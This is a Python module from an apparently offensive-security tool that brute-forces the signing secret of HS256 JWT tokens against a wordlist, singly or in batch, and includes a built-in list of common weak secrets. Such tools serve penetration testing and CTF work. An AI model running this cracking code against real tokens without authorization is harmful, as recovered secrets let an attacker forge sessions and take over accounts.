"""
JWT Cracking Module

This module provides functionality to perform brute-force attacks on JWT tokens
signed with HS256 algorithm using a wordlist of potential secrets.
"""

import jwt
import time
from typing import Optional
from rich.console import Console
from rich.progress import Progress, TaskID
from rich.panel import Panel

from .utils import read_wordlist, validate_jwt_format, format_time_duration

console = Console()

def crack_jwt(token: str, wordlist_path: str) -> Optional[str]:
    """
    Attempt to crack a JWT token using brute-force with a wordlist.
    
    Args:
        token: JWT token to crack
        wordlist_path: Path to wordlist file
        
    Returns:
        The secret key if found, None otherwise
    """
    # Validate token format
    if not validate_jwt_format(token):
        console.print("[red]❌ Invalid JWT token format![/red]")
        return None
    
    # Read wordlist
    wordlist = read_wordlist(wordlist_path)
    if not wordlist:
        console.print("[red]❌ Failed to read wordlist or wordlist is empty![/red]")
        return None
    
    console.print(f"[blue]🔍 Loaded {len(wordlist)} potential secrets from wordlist[/blue]")
    console.print()
    
    start_time = time.time()
    
    # Progress bar for brute-force attack
    with Progress() as progress:
        task = progress.add_task("[green]Cracking JWT...", total=len(wordlist))
        
        for i, secret in enumerate(wordlist):
            try:
                # Attempt to decode JWT with current secret
                # Disable validation of everything except signature for cracking
                decoded = jwt.decode(
                    token, 
                    secret, 
                    algorithms=['HS256'],
                    options={
                        "verify_signature": True,
                        "verify_exp": False,
                        "verify_nbf": False,
                        "verify_iat": False,
                        "verify_aud": False,
                        "verify_iss": False
                    }
                )
                
                # If we get here, the secret is correct
                end_time = time.time()
                duration = end_time - start_time
                
                progress.update(task, advance=i+1)
                console.print()
                
                # Display success message
                success_panel = Panel(
                    f"[bold green]✅ JWT successfully cracked![/bold green]\n\n"
                    f"[bold white]Secret:[/bold white] {secret}\n"
                    f"[bold white]Time taken:[/bold white] {format_time_duration(duration)}\n"
                    f"[bold white]Attempts:[/bold white] {i+1}/{len(wordlist)}",
                    title="Success",
                    border_style="green"
                )
                console.print(success_panel)
                
                return secret
                
            except jwt.InvalidSignatureError:
                # Wrong secret, continue
                progress.update(task, advance=1)
                continue
            except jwt.DecodeError:
                # Invalid token format or other decode error
                progress.update(task, advance=1)
                continue
            except jwt.ExpiredSignatureError:
                # Token is expired but signature is valid
                end_time = time.time()
                duration = end_time - start_time
                
                progress.update(task, advance=i+1)
                console.print()
                
                # Display success message for expired token
                success_panel = Panel(
                    f"[bold yellow]⚠️ JWT cracked but token is expired![/bold yellow]\n\n"
                    f"[bold white]Secret:[/bold white] {secret}\n"
                    f"[bold white]Time taken:[/bold white] {format_time_duration(duration)}\n"
                    f"[bold white]Attempts:[/bold white] {i+1}/{len(wordlist)}",
                    title="Success (Expired Token)",
                    border_style="yellow"
                )
                console.print(success_panel)
                
                return secret
            except Exception as e:
                # Other errors
                progress.update(task, advance=1)
                continue
    
    # If we get here, no secret was found
    end_time = time.time()
    duration = end_time - start_time
    
    console.print()
    failure_panel = Panel(
        f"[bold red]❌ Failed to crack JWT![/bold red]\n\n"
        f"[bold white]Time taken:[/bold white] {format_time_duration(duration)}\n"
        f"[bold white]Attempts:[/bold white] {len(wordlist)}\n"
        f"[bold white]Suggestion:[/bold white] Try a larger wordlist or different attack method",
        title="Failed",
        border_style="red"
    )
    console.print(failure_panel)
    
    return None

def crack_jwt_batch(tokens: list[str], wordlist_path: str) -> dict[str, Optional[str]]:
    """
    Attempt to crack multiple JWT tokens using the same wordlist.
    
    Args:
        tokens: List of JWT tokens to crack
        wordlist_path: Path to wordlist file
        
    Returns:
        Dictionary mapping tokens to their secrets (or None if not found)
    """
    results = {}
    
    console.print(f"[blue]🔍 Starting batch crack of {len(tokens)} tokens[/blue]")
    console.print()
    
    for i, token in enumerate(tokens, 1):
        console.print(f"[bold blue]Token {i}/{len(tokens)}:[/bold blue]")
        result = crack_jwt(token, wordlist_path)
        results[token] = result
        console.print()
    
    # Summary
    successful_cracks = sum(1 for result in results.values() if result is not None)
    console.print(f"[bold green]✅ Successfully cracked {successful_cracks}/{len(tokens)} tokens[/bold green]")
    
    return results

def generate_common_secrets() -> list[str]:
    """
    Generate a list of common JWT secrets for testing.
    
    Returns:
        List of common secrets
    """
    common_secrets = [
        "secret",
        "password",
        "admin",
        "jwt",
        "jwtkey",
        "key",
        "secretkey",
        "mysecret",
        "test",
        "123456",
        "password123",
        "admin123",
        "letmein",
        "qwerty",
        "default",
        "changeme",
        "welcome",
        "guest",
        "root",
        "user",
        "login",
        "auth",
        "token",
        "session",
        "security",
        "private",
        "public",
        "development",
        "production",
        "staging",
        "debug",
        "temp",
        "temporary",
        "example",
        "sample",
        "demo",
        "test123",
        "testkey",
        "devkey",
        "prodkey"
    ]
    
    return common_secrets

def save_common_secrets_wordlist(filepath: str) -> None:
    """
    Save common secrets to a wordlist file.
    
    Args:
        filepath: Path to save wordlist
    """
    secrets = generate_common_secrets()
    
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            for secret in secrets:
                f.write(f"{secret}\n")
        
        console.print(f"[green]✅ Common secrets wordlist saved to: {filepath}[/green]")
        console.print(f"[dim]Total secrets: {len(secrets)}[/dim]")
    except Exception as e:
        console.print(f"[red]❌ Error saving wordlist: {str(e)}[/red]")
